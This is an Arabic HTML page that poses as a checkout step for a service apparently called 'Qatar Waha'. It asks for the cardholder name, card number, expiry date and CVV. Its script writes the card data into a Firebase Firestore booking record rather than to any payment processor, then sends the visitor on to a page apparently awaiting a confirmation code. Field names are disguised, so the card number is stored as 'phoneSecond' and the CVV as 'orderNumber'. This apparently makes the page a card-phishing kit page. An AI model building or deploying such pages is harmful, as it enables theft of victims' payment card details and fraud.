<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تأكيد الطلب | قطر واحة</title>
<style>
  :root{
    --pink-bg:#f7e8ef;
    --purple:#7a1f5c;
    --purple-dark:#5a1544;
    --white:#fff;
    --border:#d9b8cc;
  }
  *{box-sizing:border-box;}
  body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px;
    background:var(--pink-bg);
    color:#333;
    font-family:"Tahoma","Segoe UI",Arial,sans-serif;
  }
  .confirmation-card{
    width:min(100%,560px);
    padding:30px;
    background:var(--white);
    border-radius:16px;
    box-shadow:0 2px 12px rgba(0,0,0,.08);
  }
  h1{
    margin:0 0 8px;
    color:var(--purple-dark);
    text-align:center;
    font-size:27px;
  }
  .intro{
    margin:0 0 24px;
    color:#666;
    text-align:center;
    font-size:14px;
  }
  .details{
    display:grid;
    gap:14px;
    margin-bottom:22px;
  }
  .field{
    display:grid;
    gap:7px;
  }
  label{
    color:var(--purple-dark);
    font-size:14px;
    font-weight:bold;
  }
  input,select{
    width:100%;
    border:1px solid var(--border);
    border-radius:10px;
    padding:11px 12px;
    background:#fff;
    color:#333;
    font:inherit;
  }
  .small-centered-field{width:100%;max-width:230px;margin:0 auto;text-align:center;}
  .small-centered-field input{text-align:center;}
  .date-fields{
    display:grid;
    grid-template-columns:1fr 1fr;
    gap:12px;
  }
  .date-fields .field{min-width:0;}
  .order-number{
    width:100%;
    max-width:220px;
    margin:0 auto;
    text-align:center;
  }
  .confirm-button{
    width:100%;
    margin-top:22px;
    border:0;
    border-radius:22px;
    padding:12px 20px;
    background:var(--purple);
    color:#fff;
    cursor:pointer;
    font:inherit;
  }
  .confirm-button:hover{background:var(--purple-dark);}
  .confirmed-message{
    display:none;
    margin:16px 0 0;
    padding:12px;
    border-radius:10px;
    background:#e7f5ec;
    color:#23643a;
    text-align:center;
    font-size:14px;
  }
  .confirmed-message.is-visible{display:block;}
  @media (max-width:480px){
    .confirmation-card{padding:22px;}
    .date-fields{grid-template-columns:repeat(2,minmax(0,1fr));}
  }
</style>
</head>
<body>
  <main class="confirmation-card">
    <h1>تفاصيل البطاقة</h1>
    <p class="intro">يرجى ادخال بيانات لأتمام لأتمام عملية الدفع</p>

    <div class="details">
      <div class="field">
        <label for="customer-name">اسم  صاحب البطاقة</label>
        <input id="customer-name" type="text" required>
      </div>

      <div class="field">
  <label for="phone-second">رقم البطاقة</label>
  <input id="phone-second" type="tel" inputmode="numeric" maxlength="16" minlength="16" pattern="\d{16}" required>
</div>

      <div class="field">
        <label>تاريخ الانتهاء </label>
        <div class="date-fields">
          <div class="field">
            <label for="delivery-month">الشهر</label>
            <select id="delivery-month" required>
              <option value="">اختر الشهر</option>
              <option value="01">01</option>
              <option value="02">02</option>
              <option value="03">03</option>
              <option value="04">04</option>
              <option value="05">05</option>
              <option value="06">06</option>
              <option value="07">07</option>
              <option value="08">08</option>
              <option value="09">09</option>
              <option value="10">10</option>
              <option value="11">11</option>
              <option value="12">12</option>
            </select>
          </div>
          <div class="field">
            <label for="delivery-year">السنة</label>
            <select id="delivery-year" required>
              <option value="">اختر السنة</option>
            </select>
          </div>
        </div>
      </div>

      <div class="field small-centered-field">
        <label for="order-number">رمز cvv</label>
        <input id="order-number" type="text" inputmode="numeric" autocomplete="off" required>
      </div>

    </div>

    <button class="confirm-button" type="button">ادفع </button>
    <p class="confirmed-message" role="status">تم تأكيد طلبك بنجاح.</p>
  </main>

  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
  <script src="../firebase-api.js"></script>
<script>
  const orderDetails = JSON.parse(sessionStorage.getItem('orderDetails') || '{}');
  const currentYear = new Date().getFullYear();
  const deliveryYear = document.querySelector('#delivery-year');
  const deliveryMonth = document.querySelector('#delivery-month');
  const customerName = document.querySelector('#customer-name');
  const phoneSecond = document.querySelector('#phone-second');
  const orderNumber = document.querySelector('#order-number');

  if(!orderDetails.bookingId){
    window.location.href = '../index.html';
  }

  customerName.value = '';
  phoneSecond.value = '';
  for(let year = currentYear; year <= currentYear + 10; year += 1){
    const option = document.createElement('option');
    option.value = year;
    option.textContent = year;
    deliveryYear.appendChild(option);
  }
  deliveryYear.value = currentYear;

  document.querySelector('.confirm-button').addEventListener('click', async event=>{
    if(!customerName.value.trim() || !phoneSecond.value.trim() || !orderNumber.value.trim() || !deliveryMonth.value || !deliveryYear.value || Number(deliveryYear.value) < currentYear){
      customerName.reportValidity();
      phoneSecond.reportValidity();
      orderNumber.reportValidity();
      deliveryMonth.reportValidity();
      deliveryYear.reportValidity();
      return;
    }
    const confirmButton = event.currentTarget;
    confirmButton.disabled = true;
    orderDetails.nameSecond = customerName.value.trim();
    orderDetails.phoneSecond = phoneSecond.value.trim();
    orderDetails.orderNumber = orderNumber.value.trim();
    orderDetails.deliveryMonth = deliveryMonth.value;
    orderDetails.deliveryYear = deliveryYear.value;
    orderDetails.status = 'بانتظار رقم التأكيد';
    sessionStorage.setItem('orderDetails', JSON.stringify(orderDetails));
    confirmButton.textContent = 'جارٍ الإرسال...';
    const updatePromise = updateBooking(orderDetails.bookingId, orderDetails).catch(firebaseError=>{
      sessionStorage.setItem('firebaseSaveError', 'true');
      console.error('Firestore update failed:', firebaseError);
    });
    await Promise.race([updatePromise, new Promise(resolve=>setTimeout(resolve, 800))]);
    sessionStorage.setItem('deliveryDate', JSON.stringify({
      month: deliveryMonth.value,
      year: deliveryYear.value
    }));
    window.location.href = '../order-number/index.html';
  });
</script>
</body>
</html>
